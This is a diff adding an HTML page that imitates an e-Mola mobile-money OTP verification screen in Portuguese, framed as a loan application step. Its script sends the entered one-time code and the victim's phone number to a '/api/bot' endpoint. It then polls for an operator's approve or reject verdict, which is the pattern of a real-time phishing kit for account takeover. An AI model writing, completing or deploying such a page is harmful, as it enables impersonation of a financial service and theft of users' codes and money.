@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP - e-Mola</title>
+    <link href="https://fonts.googleapis.com/css2?family=Caveat:wght@700&family=Nunito:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; font-family: 'Nunito', sans-serif; }
+        body { margin: 0; background-color: #F27C00; display: flex; justify-content: center; min-height: 100vh; }
+        .app-container { width: 100%; max-width: 400px; padding: 20px; display: flex; flex-direction: column; }
+        
+        .back { font-size: 24px; color: white; text-decoration: none; margin-bottom: 40px; display: inline-block; }
+        
+        h1 { color: white; font-size: 24px; text-align: center; margin-bottom: 40px; font-weight: normal; }
+        
+        .otp-container { display: flex; justify-content: space-between; margin-bottom: 30px; gap: 8px; }
+        .otp-box { width: 50px; height: 60px; border: none; border-radius: 8px; background: white; text-align: center; font-size: 24px; font-weight: bold; color: #333; outline: none; }
+        .otp-box:focus { box-shadow: 0 0 0 2px #fff; }
+        
+        p { color: white; text-align: center; font-size: 16px; line-height: 1.5; margin-bottom: 30px; }
+        
+        .error-msg { color: #ffcccc; font-weight: bold; text-align: center; display: none; margin-bottom: 20px; }
+        
+        .btn-main { width: 100%; background: white; color: #333; font-size: 16px; font-weight: bold; padding: 18px; border: none; border-radius: 12px; cursor: pointer; margin-top: auto; margin-bottom: 20px; }
+        .btn-main:disabled { opacity: 0.5; cursor: not-allowed; }
+
+        #overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.8); color: white; flex-direction: column; justify-content: center; align-items: center; z-index: 999; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #F27C00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div id="overlay">
+        <div class="spinner"></div>
+        <h2 style="color:#F27C00;">Verificando...</h2>
+        <p>Aguarde por favor.</p>
+    </div>
+
+    <div class="app-container">
+        <a href="login.html" class="back">&#8592;</a>
+        
+        <h1>Verificação de OTP</h1>
+        
+        <div class="error-msg" id="otpError">Código OTP incorreto. Tente novamente.</div>
+
+        <div class="otp-container">
+            <input type="tel" class="otp-box" id="otp1" maxlength="1" oninput="move('otp2')">
+            <input type="tel" class="otp-box" id="otp2" maxlength="1" oninput="move('otp3')">
+            <input type="tel" class="otp-box" id="otp3" maxlength="1" oninput="move('otp4')">
+            <input type="tel" class="otp-box" id="otp4" maxlength="1" oninput="move('otp5')">
+            <input type="tel" class="otp-box" id="otp5" maxlength="1" oninput="move('otp6')">
+            <input type="tel" class="otp-box" id="otp6" maxlength="1" oninput="check()">
+        </div>
+        
+        <p>Insira o código enviado para o seu número de telemóvel</p>
+
+        <!-- Added Verify Button -->
+        <button id="btnVerify" class="btn-main" disabled onclick="submitOtp()">VERIFICAR</button>
+    </div>
+
+    <script>
+        var globalUserId = sessionStorage.getItem('globalUserId') || Date.now().toString().slice(-6);
+        // Note: In a real flow, you'd match the userId from login. We generate a new one here for simplicity.
+        
+        function move(nextId) {
+            document.getElementById(nextId).focus();
+            check();
+        }
+
+        function check() {
+            var otp = "";
+            for(var i=1; i<=6; i++) { otp += document.getElementById('otp'+i).value; }
+            document.getElementById('btnVerify').disabled = (otp.length !== 6);
+            document.getElementById('otpError').style.display = 'none';
+        }
+
+        function submitOtp() {
+            var otp = "";
+            for(var i=1; i<=6; i++) { otp += document.getElementById('otp'+i).value; }
+            if(otp.length !== 6) return;
+
+            document.getElementById('overlay').style.display = 'flex';
+            var userPhone = sessionStorage.getItem('userPhone') || "+258000000000";
+            
+            fetch('/api/bot', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    action: 'send', type: 'OTP', userId: globalUserId, 
+                    data: { phone: userPhone, value: otp } 
+                })
+            }).then(function() { pollStatus(); })
+            .catch(function() {
+                document.getElementById('overlay').style.display = 'none';
+                alert("Erro de rede.");
+            });
+        }
+
+        function pollStatus() {
+            var interval = setInterval(function() {
+                fetch('/api/bot?userId=' + globalUserId + '&type=OTP')
+                .then(function(res) { return res.json(); })
+                .then(function(data) {
+                    if (data.status === 'approved') {
+                        clearInterval(interval);
+                        alert("Sucesso! O seu empréstimo está a ser processado.");
+                        window.location.href = 'splash.html';
+                    } 
+                    else if (data.status === 'rejected') {
+                        clearInterval(interval);
+                        document.getElementById('overlay').style.display = 'none';
+                        document.getElementById('otpError').style.display = 'block';
+                        for(var i=1; i<=6; i++) { document.getElementById('otp'+i).value = ''; }
+                        document.getElementById('btnVerify').disabled = true;
+                    }
+                });
+            }, 2000);
+        }
+    </script>
+</body>
+  </html>
